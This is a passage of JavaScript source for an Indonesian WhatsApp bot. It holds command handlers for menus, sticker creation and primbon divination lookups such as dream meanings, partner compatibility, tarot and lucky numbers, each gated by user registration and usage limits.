 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.cecan(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
}
        break 
        case 'primbonmenu': case 'primboncmd':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.primbonmenu(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
        }
break 
        case 'telestc': case 'telecmd':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.stcmenu(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
        }
break 
case 'ephotomenu': case 'ephotocmd':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.ephotomenu(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
        }
break 
case 'thanksto': case 'tqto':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.tqto(), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
         }
break 
case 'take':case 'wm':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!quoted) return reply(lang.NoToStik(prefix, command))
if (quoted.isAnimated){
let media = await alpha.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
let encmedia =  await alpha.sendVideoAsSticker(m.chat, webpToMp4.result, m, { packname: text.split('|')[0] ? text.split('|')[0] : pushname, author: text.split('|')[1] ? text.split('|')[1] : ''  })
await fs.unlinkSync(encmedia)
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await alpha.sendImageAsSticker(m.chat, media, m, { packname: text.split('|')[0] ? text.split('|')[0] : pushname, author: text.split('|')[1] ? text.split('|')[1] : '' })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply(lang.NoToStik(prefix, command))
let media = await quoted.download()
let encmedia = await alpha.sendVideoAsSticker(m.chat, media, m, { packname: text.split('|')[0] ? text.split('|')[0] : pushname, author: text.split('|')[1] ? text.split('|')[1] : '' })
await fs.unlinkSync(encmedia)
} else {
reply(lang.NoToStik(prefix, command))
}
db.data.users[m.sender].limit -= 1
}
break
case 'setwm': case 'setexif': {
if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
if (!text) return reply(lang.NoToStik(prefix, command))
if (!text.includes('|')) return reply(lang.NoToStik(prefix, command))
global.packname = text.split("|")[0]
global.author = text.split("|")[1]
reply(lang.DoneExif(global.packname, global.author))

}

break
			case 'nomerhoki': case 'nomorhoki': {
				if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!Number(text)) return reply(`Example : ${prefix + command} 887435047326`)
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'artimimpi': case 'tafsirmimpi': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} belanja`)
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
			case 'ramalanjodoh': case 'ramaljodoh': {
				if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} Zeeone, 12, 1, 2004, Clara, 22, 2, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} Zeeone, 12, 1, 2004, Clara, 22, 2, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'suamiistri': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} Zeeone, 12, 1, 2004, Clara, 22, 2, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'ramalancinta': case 'ramalcinta': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} Zeeone, 12, 1, 2004, Clara, 22, 2, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'artinama': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} Zeeone`)
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'kecocokannama': case 'cocoknama': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} Zeeone, 12, 1, 2004`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} Zeeone|Clara`)
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendImage(m.chat,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'jadianpernikahan': case 'jadiannikah': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} 6, 12, 2020`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'sifatusaha': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!ext)return reply(`Example : ${ command} 28, 12, 2021`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'rejeki': case 'rezeki': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} 12, 1, 2004`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'pekerjaan':{
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} 12, 1, 2004`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : 12, 1, 2004`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'potensipenyakit': case 'penyakit': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} 12, 1, 2004`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'artitarot': case 'tarot': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} 12, 1, 2004`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'fengshui': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} Zeeone, 1, 2004\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`)
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'haribaik': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} 12, 1, 2004`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'harisangar': case 'taliwangke': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
